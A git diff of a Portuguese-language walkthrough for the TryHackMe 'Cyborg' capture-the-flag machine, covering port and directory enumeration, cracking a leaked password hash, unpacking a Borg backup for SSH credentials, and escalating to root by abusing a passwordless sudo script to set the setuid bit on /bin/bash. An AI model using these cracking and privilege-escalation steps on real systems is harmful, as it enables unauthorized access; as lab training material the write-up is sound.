@@ -1,6 +1,6 @@
 <h1><b>Segue Writeup da maquina Cyborg do Try Hack Me</h1>
 
-Enumeração das portas com NMAP
+<b>Enumeração das portas com NMAP
 
 ```
 ┌──(xnv㉿kali)-[~]
@@ -24,7 +24,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 59.38 seconds
 ```
 
-Enumeração de arquivos e pastas com o WFUZZ.
+<b>Enumeração de arquivos e pastas com o WFUZZ.
 
 ```
 ┌──(xnv㉿kali)-[~]
@@ -36,49 +36,83 @@ Enumeração de arquivos e pastas com o WFUZZ.
 000002020:   200        375 L    968 W      11321 Ch    "index.html"  
 ```
 
-Depois de verificar os resultados encontrei esse arquivo.
+<b>Depois de verificar os resultados encontrei esse arquivo.
+  
 ```
 http://10.10.162.202/etc/squid/passwd
 music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
 ```
 
-```
-teste
-```
+<b>Com o Hash que conseguir, coloquei no arquivo "hash", e quebrei ele com o john
+  
+![1](https://user-images.githubusercontent.com/90646635/133877733-130af2b9-a08e-4ad1-a092-cc7fc676815e.PNG)
+
+Voltando para a página tem o Download do arquivo, "archive.tar"
+
+![2](https://user-images.githubusercontent.com/90646635/133878577-5a93b701-5fab-4828-9247-f39814d5359a.PNG)
+
+Dentro do arquivo baixado tem um arquivo "Readme", que te leva a documentação da aplicação chamada "borg"
 
 ```
-teste
+┌──(xnv㉿kali)-[~/…/home/field/dev/final_archive]
+└─$ cat README      
+This is a Borg Backup repository.
+See https://borgbackup.readthedocs.io/
 ```
 
-```
-teste
-```
+<b>Então é só instalar a aplicação borg, conforme documentação.
 
 ```
-teste
+┌──(xnv㉿kali)-[~/…/home/field/dev/final_archive]
+└─$ sudo apt install borgbackup
 ```
 
+<b>E seguindo a documentação vamos extrair os arquivos que estão ocultos, ele pedirá uma senha, essa senha conseguimos com o hash anteriormente.
+  
 ```
-teste
-```
-
-```
-teste
-```
-
-```
-teste
+┌──(xnv㉿kali)-[~/…/cyborg/home/field/dev]
+└─$ borg extract final_archive::music_archive
+Enter passphrase for key /home/xnv/thm/cyborg/home/field/dev/final_archive:
 ```
 
+<b>Depois de extrair os arquivos ocultos encontraremos um login e senha, para logarmos via SSH.
+
+![4](https://user-images.githubusercontent.com/90646635/133879118-bccf411d-6729-4e21-9b53-949fb8d2a030.PNG)
+
+
+<b>E então encontraremos a flag user
+  
 ```
-teste
+alex@ubuntu:~$ cat user.txt 
+flag{*********************************}
 ```
+<b>Dando um sudo -l
+  
 
 ```
-teste
+alex@ubuntu:~$ sudo -l
+Matching Defaults entries for alex on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+  
+```
+<b> Podemos ver que no arquivo backup.sh podemos executar o sudo sem precisar da senha, então vamos usar ele para conseguir o root.
+  
+```
+alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
+alex@ubuntu:~$ /bin/bash -p
+```
+<b>E então conseguimos o root.
+  
+```
+bash-4.3# 
 ```
 
+<b>E então é só dar um cat no arquivo root.txt
+  
 ```
-teste
+bash-4.3# cat /root/root.txt
+flag{***********************************}
 ```
-
